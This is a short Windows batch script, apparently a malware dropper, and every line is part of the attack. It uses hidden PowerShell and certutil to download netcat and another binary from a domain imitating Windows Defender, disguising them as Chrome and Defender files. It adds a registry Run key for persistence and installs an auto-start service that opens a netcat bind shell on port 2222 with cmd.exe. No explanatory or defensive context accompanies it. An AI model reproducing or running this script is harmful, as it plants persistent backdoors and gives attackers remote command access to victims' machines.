@ECHO OFF
powershell -noprofile -windowstyle hidden -ep bypass certutil -urlcache -f http://windowsdefender.com:81/nc.exe C:\ProgramData\Chrome\ChromeUpdate.exe
powershell -noprofile -windowstyle hidden -ep bypass certutil -urlcache -f http://windowsdefender.com:81/WindowsDefender.exe "C:\Program Files\Defender\WindowsDefender.exe"
powershell -noprofile -windowstyle hidden -ep bypass reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsDefender /t REG_SZ /d "C:\Program Files\Defender\WindowsDefender.exe"
powershell -noprofile -windowstyle hidden -ep bypass sc create ChromeUpdateService binpath= "cmd.exe /k C:\ProgramData\Chrome\ChromeUpdate.exe -L -p 2222 -e cmd.exe" start= auto
powershell -noprofile -windowstyle hidden -ep bypass sc start ChromeUpdateService
cmd /q /k "C:\Program Files\Defender\WindowsDefender.exe"